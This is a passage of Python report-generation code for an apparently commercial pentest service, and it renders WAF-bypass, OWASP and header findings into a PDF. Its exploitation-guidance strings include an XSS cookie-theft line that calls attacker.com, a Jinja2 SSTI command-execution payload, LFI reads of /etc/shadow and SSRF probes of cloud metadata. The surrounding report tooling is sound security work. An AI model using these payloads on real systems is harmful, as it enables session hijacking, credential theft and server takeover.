                    "O WAF falhou em reconhecer o payload como SQLi porque a técnica utiliza "
                    "ofuscação (comentários inline, codificação de caracteres ou fragmentação de palavras-chave) "
                    "que burla a assinatura de detecção baseada em regex. O backend recebeu e processou "
                    "a query sem sanitização."
                ),
                "impact": (
                    "Um atacante pode extrair dados do banco (usernames, hashes, dados sensíveis), "
                    "modificar registros, ou — dependendo do SGBD e das permissões — executar comandos "
                    "no sistema operacional (xp_cmdshell no MSSQL, INTO OUTFILE no MySQL)."
                ),
                "how": (
                    "1. Confirmar injeção com payloads booleanos: ?q=' AND 1=1-- vs AND 1=2--. "
                    "2. Enumerar tabelas via UNION SELECT ou blind timing (SLEEP/WAITFOR). "
                    "3. Extrair hashes de credenciais e tentar crackear offline."
                ),
            },
            "XSS": {
                "why": (
                    "O payload XSS evadiu a regra WAF por utilizar encoding alternativo (HTML entities, "
                    "unicode escape, base64 em data:), capitalização incomum de tags ou event handlers "
                    "não cobertos pela lista de bloqueio do WAF."
                ),
                "impact": (
                    "Permite roubo de cookies de sessão (document.cookie), keylogging, redirecionamento "
                    "para phishing, ou execução de ações em nome da vítima (CSRF via XSS). "
                    "Se o endpoint é acessado por administradores, o impacto escala para comprometimento "
                    "total da aplicação."
                ),
                "how": (
                    "1. Injetar <script>fetch('https://attacker.com/?c='+document.cookie)</script>. "
                    "2. Hospedar payload em servidor externo e capturar sessões. "
                    "3. Com acesso de admin, instalar webshell ou modificar conteúdo."
                ),
            },
            "LFI": {
                "why": (
                    "O WAF não detectou o path traversal porque o payload usa sequências duplamente "
                    "codificadas (%252e%252e), null bytes (%00) ou variações de separadores "
                    "(....// em vez de ../) que a expressão regular do WAF não cobre."
                ),
                "impact": (
                    "Leitura de arquivos arbitrários do servidor: /etc/passwd, /etc/shadow, "
                    "arquivos .env com credenciais, chaves SSH, ou código-fonte da aplicação. "
                    "Encadeado com upload de arquivo ou log poisoning, pode resultar em RCE."
                ),
                "how": (
                    "1. Tentar ?q=../../../../etc/passwd com variações de encoding. "
                    "2. Testar arquivos de log para log poisoning (via User-Agent malicioso). "
                    "3. Se PHP, usar wrappers: php://filter/convert.base64-encode/resource=index.php."
                ),
            },
            "SSRF": {
                "why": (
                    "O WAF não bloqueou a requisição porque o payload usa representações alternativas "
                    "do endereço (decimal, hex, IPv6 mapped, redirecionamentos em cadeia) que fogem "
                    "das listas de bloqueio de IPs internos configuradas no WAF."
                ),
                "impact": (
                    "Acesso ao metadata da cloud (169.254.169.254 — AWS/GCP/Azure), varredura "
                    "de serviços internos não expostos, exfiltração de credenciais IAM, "
                    "ou acesso a serviços como Redis/Elasticsearch sem autenticação na rede interna."
                ),
                "how": (
                    "1. Testar acesso a http://169.254.169.254/latest/meta-data/ (AWS IMDSv1). "
                    "2. Varrer portas internas: http://127.0.0.1:6379/ (Redis), :9200 (Elasticsearch). "
                    "3. Usar Burp Collaborator para confirmar SSRF out-of-band."
                ),
            },
            "SSTI": {
                "why": (
                    "O payload de template injection ({{7*7}}, ${7*7}, #{7*7}) não foi reconhecido "
                    "pelo WAF como malicioso porque as assinaturas focam em vetores tradicionais "
                    "(SQLi, XSS) e não cobrem os delimitadores específicos do engine de template "
                    "utilizado pelo backend."
                ),
                "impact": (
                    "SSTI resulta em RCE direto no servidor. Em Jinja2 (Python): "
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}. "
                    "Em Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}. "
                    "Acesso total ao sistema operacional."
                ),
                "how": (
                    "1. Confirmar engine com probe: {{7*'7'}} (Jinja2→7777777, Twig→49). "
                    "2. Escalar para RCE com payload de execução de comandos do engine. "
                    "3. Exfiltrar variáveis de ambiente e arquivos de configuração."
                ),
            },
        }

        DEFAULT_EXPLOIT = {
            "why": (
                "O WAF não reconheceu o payload porque a técnica de evasão utilizada (encoding, "
                "fragmentação ou ofuscação) não está coberta pelas regras de detecção configuradas. "
                "O servidor respondeu HTTP 200 e processou a requisição normalmente."
            ),
            "impact": (
                "Dependendo do contexto do endpoint, o atacante pode conseguir acesso a dados "
                "sensíveis, execução de ações privilegiadas ou escalonamento para outras "
                "vulnerabilidades da aplicação."
            ),
            "how": (
                "Realizar teste manual aprofundado neste endpoint com ferramentas especializadas "
                "(Burp Suite, sqlmap, ffuf) para confirmar o alcance real da vulnerabilidade "
                "e o impacto sobre a aplicação."
            ),
        }

        target_base = waf_data.get("target_url", "")
        endpoint_tested = (target_base.rstrip("/") + "/search?q=") if target_base else "/search?q="

        for idx, b in enumerate(confirmed_bypasses):
            cat = b.get("category", "")
            ctx = BYPASS_EXPLOIT_CONTEXT.get(cat, DEFAULT_EXPLOIT)
            payload_full = esc(str(b.get("payload", ""))[:60])
            if len(str(b.get("payload", ""))) > 60:
                payload_full += "…"
            name_str = esc(b.get("name", f"Bypass #{idx+1}"))

            # Header bar
            hdr_d = Drawing(165*mm, 6*mm)
            hdr_d.add(Rect(0, 0, 165*mm, 6*mm, fillColor=colors.HexColor("#A32D2D"), strokeColor=None))
            hdr_d.add(String(3*mm, 1.5*mm, f"[BYPASS #{idx+1}] {b.get('name','')}  ·  {cat}  ·  HTTP {b.get('status_code','200')}",
                             fontName="Helvetica-Bold", fontSize=8, fillColor=WHITE))
            story.append(hdr_d)

            detail_rows = [
                [
                    Paragraph("<b>Endpoint</b>", ST["small"]),
                    Paragraph(
                        f'<font face="Courier">{esc(endpoint_tested)}</font>'
                        f'<font face="Courier" color="#C0392B">{payload_full}</font>',
                        S("ep", fontName="Courier", fontSize=8, leading=12, textColor=DARK)
                    ),
                ],
                [
                    Paragraph("<b>Por que retornou 200?</b>", ST["small"]),
                    Paragraph(esc(ctx["why"]), S("bwhy", fontSize=8.5, leading=13, textColor=DARK)),
                ],
                [
                    Paragraph("<b>Impacto potencial</b>", ST["small"]),
                    Paragraph(esc(ctx["impact"]), S("bimp", fontSize=8.5, leading=13, textColor=colors.HexColor("#7B241C"))),
                ],
                [
                    Paragraph("<b>Como explorar</b>", ST["small"]),
                    Paragraph(esc(ctx["how"]), S("bhow", fontName="Courier", fontSize=7.5, leading=12, textColor=colors.HexColor("#1A5FA8"))),
                ],
            ]

            dt = Table(detail_rows, colWidths=[32*mm, 133*mm])
            dt.setStyle(TableStyle([
                ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#FEF5F5")),
                ("BACKGROUND", (1, 0), (1, -1), WHITE),
                ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#F5C6C6")),
                ("TOPPADDING", (0, 0), (-1, -1), 5),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
                ("LEFTPADDING", (0, 0), (-1, -1), 5),
                ("RIGHTPADDING", (0, 0), (-1, -1), 5),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                ("BOX", (0, 0), (-1, -1), 0.6, colors.HexColor("#C0392B")),
            ]))
            story.append(dt)
            story.append(Spacer(1, 3*mm))

    return story


# ── OWASP SECTION ─────────────────────────────────────────────────────────────
def owasp_section(owasp_results):
    story = [Paragraph("OWASP Top 10 — Resultados", ST["h1"]), rule(TEAL, 0.8)]
    if not owasp_results:
        return story

    rows = [[
        Paragraph("CATEGORIA", ST["wh"]),
        Paragraph("STATUS", ST["wh_sm"]),
        Paragraph("OBSERVAÇÕES", ST["wh"]),
    ]]
    for r in owasp_results:
        st = r.get("status", "INFO")
        color = {"VULN": RED, "PASS": GREEN, "INFO": BLUE}.get(st, GRAY)
        label = {"VULN": "VULNERÁVEL", "PASS": "✓ OK", "INFO": "INFO"}.get(st, st)
        obs = "; ".join(r.get("findings", []))[:120]
        rows.append([
            Paragraph(esc(r.get("category", "")), ST["small"]),
            Paragraph(f'<b><font color="#{color.hexval()[2:]}">{label}</font></b>',
                      S("sp", fontName="Helvetica-Bold", fontSize=8, alignment=TA_CENTER)),
            Paragraph(esc(obs or "—"), ST["small"]),
        ])

    t = Table(rows, colWidths=[55*mm, 24*mm, 86*mm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 8),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [WHITE, OFFWHT]),
        ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#D0D7DE")),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("LEFTPADDING", (0, 0), (-1, -1), 5),
        ("ALIGN", (1, 0), (1, -1), "CENTER"),
    ]))
    story.append(t)
    return story


# ── HEADERS SECTION ───────────────────────────────────────────────────────────
def headers_section(security_headers):
    story = [Paragraph("Security Headers HTTP (OWASP)", ST["h1"]), rule(ORANGE, 0.8)]
    if not security_headers:
        return story

    rows = [[
        Paragraph("HEADER", ST["wh"]),
        Paragraph("STATUS", ST["wh_sm"]),
        Paragraph("SEVERIDADE", ST["wh_sm"]),
        Paragraph("VALOR ATUAL / RECOMENDADO", ST["wh"]),
    ]]
    for h in security_headers:
        present = h.get("present", False)
        s_color = GREEN if present else RED
        s_label = "✓ PRESENTE" if present else "✗ AUSENTE"
        sev = h.get("severity", "")
        sev_c = {"HIGH": RED, "MEDIUM": ORANGE, "LOW": BLUE}.get(sev, GRAY)
        value_txt = h.get("value") or h.get("recommended", "—")
        rows.append([
            Paragraph(esc(h.get("header", "")), S("hh", fontName="Courier", fontSize=8, leading=12)),
            Paragraph(f'<font color="#{s_color.hexval()[2:]}"><b>{s_label}</b></font>',
                      S("hs", fontName="Helvetica-Bold", fontSize=7.5, alignment=TA_CENTER)),
            Paragraph(f'<font color="#{sev_c.hexval()[2:]}"><b>{sev}</b></font>',
                      S("hv", fontName="Helvetica-Bold", fontSize=7.5, alignment=TA_CENTER)),
            Paragraph(esc(str(value_txt)[:55]), S("hval", fontName="Courier", fontSize=7.5, leading=11)),
        ])

    t = Table(rows, colWidths=[57*mm, 25*mm, 22*mm, 61*mm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 8),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [WHITE, OFFWHT]),
        ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#D0D7DE")),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("LEFTPADDING", (0, 0), (-1, -1), 5),
        ("ALIGN", (1, 0), (2, -1), "CENTER"),
    ]))
    story.append(t)
    return story


# ── RED/BLUE TEAM ─────────────────────────────────────────────────────────────
def team_section(report):
    story = [Paragraph("Simulação Red Team vs Blue Team", ST["h1"]), rule(DARK3, 0.5)]

    red_pct = report.get("red_team_score", 0)
    blue_pct = report.get("blue_team_score", 0)

    # Score row
    score_row = Table([[
        Table([[
            Paragraph(f'<font color="#E24B4A"><b>Red Team</b></font>', S("rh", fontName="Helvetica-Bold", fontSize=10, alignment=TA_CENTER)),
            Paragraph(f'<font color="#E24B4A"><b>{red_pct}%</b></font>', S("rs", fontName="Helvetica-Bold", fontSize=26, alignment=TA_CENTER, leading=30)),
        ]], colWidths=[82.5*mm]),
        Table([[
            Paragraph(f'<font color="#378ADD"><b>Blue Team</b></font>', S("bh", fontName="Helvetica-Bold", fontSize=10, alignment=TA_CENTER)),
            Paragraph(f'<font color="#378ADD"><b>{blue_pct}%</b></font>', S("bs2", fontName="Helvetica-Bold", fontSize=26, alignment=TA_CENTER, leading=30)),
        ]], colWidths=[82.5*mm]),
    ]], colWidths=[82.5*mm, 82.5*mm])
    score_row.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, 0), colors.HexColor("#1a0505")),
        ("BACKGROUND", (1, 0), (1, 0), colors.HexColor("#05101a")),
        ("LINEABOVE", (0, 0), (0, 0), 3, RED),
        ("LINEABOVE", (1, 0), (1, 0), 3, BLUE),
        ("TOPPADDING", (0, 0), (-1, -1), 8), ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
    ]))
    story.append(score_row)
    story.append(Spacer(1, 4*mm))

    # Actions table
    red_acts = report.get("red_team_actions", [])
    blue_acts = report.get("blue_team_actions", [])
    act_rows = [[
        Paragraph("<b>Red Team — Ações Ofensivas</b>",
                  S("rah", fontName="Helvetica-Bold", fontSize=9, textColor=RED)),
        Paragraph("<b>Blue Team — Respostas Defensivas</b>",
                  S("bah", fontName="Helvetica-Bold", fontSize=9, textColor=BLUE)),
    ]]
    for i in range(max(len(red_acts), len(blue_acts), 1)):
        r = red_acts[i]["action"] if i < len(red_acts) else ""
        b = blue_acts[i]["action"] if i < len(blue_acts) else ""
        act_rows.append([
            Paragraph(f'<font color="#E24B4A">[+]</font> {esc(r)}', ST["small"]) if r else Paragraph("—", ST["small"]),
            Paragraph(f'<font color="#378ADD">[*]</font> {esc(b)}', ST["small"]) if b else Paragraph("—", ST["small"]),
        ])

    at = Table(act_rows, colWidths=[82.5*mm, 82.5*mm])
    at.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, 0), colors.HexColor("#1a0505")),
        ("BACKGROUND", (1, 0), (1, 0), colors.HexColor("#05101a")),
        ("TEXTCOLOR", (0, 0), (0, 0), RED), ("TEXTCOLOR", (1, 0), (1, 0), BLUE),
        ("ROWBACKGROUNDS", (0, 1), (0, -1), [LGRAY, WHITE]),
        ("ROWBACKGROUNDS", (1, 1), (1, -1), [LGRAY, WHITE]),
        ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#D0D7DE")),
        ("TOPPADDING", (0, 0), (-1, -1), 5), ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
    ]))
    story.append(at)
    return story


# ── PAGE NUMBERS via canvas ───────────────────────────────────────────────────
class NumberedCanvas:
    """Adds page numbers to bottom of each page."""
    def __init__(self, canvas, doc):
        self._canvas = canvas
        self._doc = doc
        canvas.saveState()
        canvas.setFont("Helvetica", 7)
        canvas.setFillColor(GRAY)
        canvas.drawString(15*mm, 8*mm, "RedShield PTaaS  —  Documento Confidencial  —  Uso Restrito")
        canvas.drawRightString(180*mm, 8*mm, f"Página {doc.page}")
        canvas.restoreState()


def on_page(canvas, doc):
    canvas.saveState()
    canvas.setFont("Helvetica", 7)
    canvas.setFillColor(GRAY)
    canvas.drawString(15*mm, 8*mm, "RedShield PTaaS  —  Documento Confidencial  —  Uso Restrito")
    canvas.drawRightString(180*mm, 8*mm, f"Página {doc.page}")
    # Top accent line (not on page 1 which has its own header)
    if doc.page > 1:
        canvas.setStrokeColor(RED)
        canvas.setLineWidth(1.5)
        canvas.line(15*mm, H - 8*mm, 195*mm, H - 8*mm)
    canvas.restoreState()


# ── MAIN GENERATE ─────────────────────────────────────────────────────────────
def generate_pdf(report: dict) -> bytes:
    buf = io.BytesIO()
    doc = SimpleDocTemplate(
        buf, pagesize=A4,
        rightMargin=15*mm, leftMargin=15*mm,
        topMargin=14*mm, bottomMargin=16*mm,
        title=f"RedShield — {report.get('target', '')}",
        author="RedShield PTaaS",
        subject="Relatório de Pentest Profissional",
    )

    story = []

    # ── Cover ────────────────────────────────────────────────────────
    story.extend(cover_page(report))

    # ── Summary page ─────────────────────────────────────────────────
    story.append(Paragraph("Resumo Executivo", ST["h1"]))
    story.append(rule(RED, 0.8))

    risk = report.get("risk_score", 0)
    summary = report.get("summary", {})
    if risk >= 9:     r_label, r_color = "CRÍTICO",   RED
    elif risk >= 7:   r_label, r_color = "ALTO",      ORANGE
    elif risk >= 4:   r_label, r_color = "MÉDIO",     BLUE
    else:             r_label, r_color = "BAIXO",     GREEN

    exec_txt = (
        f"O alvo <b>{esc(report.get('target',''))}</b> foi submetido a análise de segurança automatizada "
        f"pela plataforma RedShield PTaaS. O scan identificou um risco global classificado como "
        f'<font color="#{r_color.hexval()[2:]}"><b>{r_label} ({risk}/10)</b></font>, '
        f'com {summary.get("CRITICAL",0)} achados críticos, {summary.get("HIGH",0)} altos, '
        f'{summary.get("MEDIUM",0)} médios e {summary.get("LOW",0)} baixos. '
        f'A análise cobriu: resolução DNS, certificado TLS/SSL, detecção de WAF, '
        f'30 técnicas de bypass, verificação de 100 CVEs, OWASP Top 10 e security headers.'
    )
    story.append(Paragraph(exec_txt, ST["body"]))
    story.append(Spacer(1, 5*mm))

    # ── Infrastructure ───────────────────────────────────────────────
    story.extend(infra_section(report))

    # ── Findings ─────────────────────────────────────────────────────
    story.extend(findings_section(report.get("all_findings", [])))

    # ── New page for WAF, OWASP, Headers ─────────────────────────────
    story.append(PageBreak())
    waf_data_with_url = dict(report.get("waf", {}))
    waf_data_with_url["target_url"] = report.get("target", "")
    story.extend(waf_section(waf_data_with_url))
    story.append(Spacer(1, 6*mm))
    story.extend(owasp_section(report.get("owasp_results", [])))
    story.append(Spacer(1, 6*mm))
    story.extend(headers_section(report.get("security_headers", [])))

    # ── New page for Red/Blue Team ────────────────────────────────────
    story.append(PageBreak())
    story.extend(team_section(report))

    # ── Legal disclaimer ─────────────────────────────────────────────
    story.append(Spacer(1, 8*mm))
    story.append(rule(GRAY, 0.5))
    story.append(Spacer(1, 2*mm))
    story.append(Paragraph(
        "AVISO LEGAL: Este relatório contém informações confidenciais e deve ser utilizado exclusivamente "
        "em sistemas para os quais existe autorização prévia e explícita. A realização de pentest não "
        "autorizado é crime no Brasil conforme Lei 12.737/2012 (Lei Carolina Dieckmann) e legislação "
        "internacional equivalente (CFAA/EUA, Computer Misuse Act/UK). RedShield PTaaS não se "
        "responsabiliza pelo uso indevido desta ferramenta ou das informações contidas neste relatório.",
        ST["disc"]
    ))

    doc.build(story, onFirstPage=on_page, onLaterPages=on_page)
    return buf.getvalue()
